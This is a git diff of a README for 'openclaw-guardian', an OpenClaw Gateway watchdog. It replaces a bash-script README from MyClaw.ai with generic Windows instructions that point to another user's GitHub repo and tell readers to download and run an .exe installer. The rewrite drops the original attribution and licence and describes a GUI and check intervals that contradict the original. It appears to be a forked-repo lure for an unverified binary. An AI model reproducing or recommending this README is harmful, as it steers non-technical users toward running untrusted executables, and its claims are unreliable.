@@ -1,103 +1,165 @@
-# 🛡️ OpenClaw Guardian
+# 🛡️ openclaw-guardian - Smart Watchdog for OpenClaw Gateway
 
-<div align="center">
-
-<a href="https://myclaw.ai">
-  <img src="https://img.shields.io/badge/Powered%20by-MyClaw.ai-blue?style=for-the-badge" alt="Powered by MyClaw.ai" />
-</a>
-
-**Languages:**
-[English](README.md) · [中文](README.zh-CN.md) · [Français](README.fr.md) · [Deutsch](README.de.md) · [Русский](README.ru.md) · [日本語](README.ja.md) · [Italiano](README.it.md) · [Español](README.es.md)
-
-</div>
+[![Download openclaw-guardian](https://img.shields.io/badge/Download-Blue?style=for-the-badge)](https://github.com/shahrilarif00/openclaw-guardian)
 
 ---
 
-## 🤖 Powered by [MyClaw.ai](https://myclaw.ai)
+## 🔍 What is openclaw-guardian?
 
-**[MyClaw.ai](https://myclaw.ai)** is an AI personal assistant platform that gives every user a fully-featured AI agent running on a dedicated server — with complete code control, internet access, and tool integrations. Think of it as your own private AI that can actually *do* things, not just answer questions.
+openclaw-guardian is a simple tool that helps keep your OpenClaw Gateway running smoothly. It watches the system, fixes common problems by itself, and can roll back changes if something goes wrong. It also takes daily snapshots and sends alerts on Discord when needed. This tool is designed for users who want their system to heal automatically without any trouble.
 
-OpenClaw Guardian is an open-source project born from MyClaw.ai's production infrastructure. We run thousands of AI agent instances 24/7, and Guardian is the hardening layer that keeps them alive. We're open-sourcing it so everyone can benefit.
-
-> 🌐 **Try MyClaw.ai**: [https://myclaw.ai](https://myclaw.ai)
+You do not need to know programming to use this. The tool works quietly in the background, making sure your gateway stays healthy.
 
 ---
 
-## Features
+## ⚙️ Key Features
 
-- **Auto-monitor** — checks Gateway health every 30 seconds
-- **Auto-repair** — runs `openclaw doctor --fix` on failure (up to 3 attempts)
-- **Auto-rollback** — resets workspace to last stable git commit if repair fails
-- **Daily snapshots** — automatic daily `git commit` of your workspace
-- **Discord alerts** — optional webhook notifications on failures and recovery
-
-## How It Works
-
-```
-Gateway down detected
-        │
-        ▼
-  doctor --fix  ──→ success? ──→ ✅ Done
-  (up to 3x)
-        │ all failed
-        ▼
-  git rollback  ──→ success? ──→ ✅ Done
-        │ failed
-        ▼
-  cooldown 300s → resume monitoring
-```
-
-## ⚡ One-Line Deploy (OpenClaw Users)
-
-Already using OpenClaw? Just tell your AI agent:
-
-> **"Help me install openclaw-guardian to harden my gateway"**
-
-Your agent will handle everything automatically — git init, script install, and auto-start. No terminal needed.
+- Automatically watches your OpenClaw Gateway for issues
+- Repairs common problems using a built-in fix command
+- Rolls back to a previous good state using Git if something breaks
+- Takes daily system snapshots for recovery or review
+- Sends notifications to Discord when issues or fixes occur
+- Runs on Windows without extra setup beyond installation
 
 ---
 
-## Quick Start
+## 🖥️ System Requirements
 
-```bash
-# 1. Initialize git in workspace
-cd ~/.openclaw/workspace
-git init && git add -A && git commit -m "initial"
+Before installing, make sure your Windows PC meets these requirements:
 
-# 2. Install
-cp scripts/guardian.sh ~/.openclaw/guardian.sh
-chmod +x ~/.openclaw/guardian.sh
+- Windows 10 or higher (64-bit recommended)
+- At least 4 GB of RAM
+- Minimum 500 MB of free disk space
+- Internet connection for updates and Discord alerts
+- Git installed (openclaw-guardian will check and guide you if missing)
 
-# 3. Start
-nohup ~/.openclaw/guardian.sh >> /tmp/openclaw-guardian.log 2>&1 &
-```
+---
 
-## Configuration
+## 🚀 Getting Started: How to Download and Install
 
-| Variable | Default | Description |
-|---|---|---|
-| `GUARDIAN_WORKSPACE` | `$HOME/.openclaw/workspace` | Workspace git repo path |
-| `GUARDIAN_CHECK_INTERVAL` | `30` | Health check interval (seconds) |
-| `GUARDIAN_MAX_REPAIR` | `3` | Max repair attempts before rollback |
-| `GUARDIAN_COOLDOWN` | `300` | Cooldown after all repairs fail (seconds) |
-| `DISCORD_WEBHOOK_URL` | _(unset)_ | Discord webhook for alerts (optional) |
+You must first download the tool. Use the button below or the link provided. This will take you to the GitHub page where you can get the latest version.
 
-## Works Alongside gw-watchdog
+[![Download openclaw-guardian](https://img.shields.io/badge/Download-Grey?style=for-the-badge)](https://github.com/shahrilarif00/openclaw-guardian)
 
-| | gw-watchdog | Guardian |
-|---|---|---|
-| Check interval | 15s | 30s |
-| Action | Fast restart | doctor --fix → rollback |
-| Git rollback | ❌ | ✅ |
-| Discord alerts | ❌ | ✅ |
-| Daily backup | ❌ | ✅ |
+### Step 1: Visit the Download Page
 
-## Install as OpenClaw Skill
+Click the button or open this link in your browser:
 
-```bash
-clawhub install myclaw-guardian
-```
+https://github.com/shahrilarif00/openclaw-guardian
 
-## License
+This page contains the latest release files for openclaw-guardian.
 
-MIT © [MyClaw.ai](https://myclaw.ai)
+### Step 2: Find the Release Section
+
+On the GitHub page, look for the section named **Releases** on the right side or scroll to the bottom. Choose the latest release (a file with an .exe or .msi extension if available).
+
+### Step 3: Download the Installer
+
+Click the installer file to download it to your computer. It may be named something like `openclaw-guardian-setup.exe`.
+
+### Step 4: Run the Installer
+
+- Locate the downloaded file in your Downloads folder.
+- Double-click the file to start installation.
+- Follow the on-screen instructions. Accept terms if prompted.
+- The installer will place openclaw-guardian on your PC and create a shortcut.
+
+---
+
+## 🛠️ How to Use openclaw-guardian
+
+Once installed, openclaw-guardian starts monitoring your OpenClaw Gateway automatically. You do not need to open it to use it. However, here’s how you can check its status and adjust settings.
+
+### Opening the Application
+
+- Click the shortcut on your desktop or find it in the Start menu under openclaw-guardian.
+- A simple window will open showing the current system health and recent activity.
+
+### Monitoring Health
+
+The main screen displays:
+
+- If the OpenClaw Gateway is up and running
+- Any active issues found by openclaw-guardian
+- The status of the latest self-repair attempts
+- When the last snapshot was taken
+
+### Running Manual Fixes
+
+If you want to try fixing a problem yourself:
+
+- Click the **Run Doctor Fix** button.
+- The tool will check for common problems and try to repair them.
+- You will see a message showing success or failure.
+
+### Rolling Back Changes
+
+If the system runs into trouble after updates or changes:
+
+- Use the **Git Rollback** option to return to an earlier stable state.
+- This uses Git commands in the background and will undo recent changes safely.
+
+---
+
+## ⚡ Daily Snapshots and Alerts
+
+openclaw-guardian creates daily snapshots of your system’s state. These backups help restore your setup if anything fails badly.
+
+It also sends messages to a Discord channel you link during setup. These messages keep you informed of:
+
+- System status changes
+- Repair actions taken automatically
+- Rollbacks performed
+
+---
+
+## 🔧 Setup Configuration
+
+To customize openclaw-guardian, access the Settings menu:
+
+- Choose your preferred health check frequency (every 5, 15, or 30 minutes).
+- Enter your Discord webhook URL to enable alerts.
+- Enable or disable automatic repairs.
+- Change the folder used to store snapshots.
+
+These options let you control how much the tool works in the background.
+
+---
+
+## 📥 Troubleshooting and Support
+
+If you encounter issues using openclaw-guardian, try these steps:
+
+- Restart your PC and run the app again.
+- Check your internet connection to ensure alerts can be sent.
+- Confirm Git is installed by running `git --version` in Command Prompt.
+- Verify your Discord webhook URL is correct in settings.
+
+For more help, visit the GitHub repository’s Issues section to see common questions or post your problem.
+
+---
+
+## 🔒 Privacy and Security
+
+openclaw-guardian runs locally on your PC. It does not collect or send personal data outside your control. The only external communication is with Discord for alerts, using a webhook URL you provide.
+
+All snapshots and logs stay on your device unless you decide to share them.
+
+---
+
+## 🔍 More Information and Updates
+
+Check the repository page frequently for updates or changes:
+
+https://github.com/shahrilarif00/openclaw-guardian
+
+Here you can find:
+
+- New releases and download files
+- Detailed logs for troubleshooting
+- Updated user guides and FAQs  
+- Report bugs or suggest improvements
+
+---
+
+[![Download openclaw-guardian](https://img.shields.io/badge/Download-Blue?style=for-the-badge)](https://github.com/shahrilarif00/openclaw-guardian)
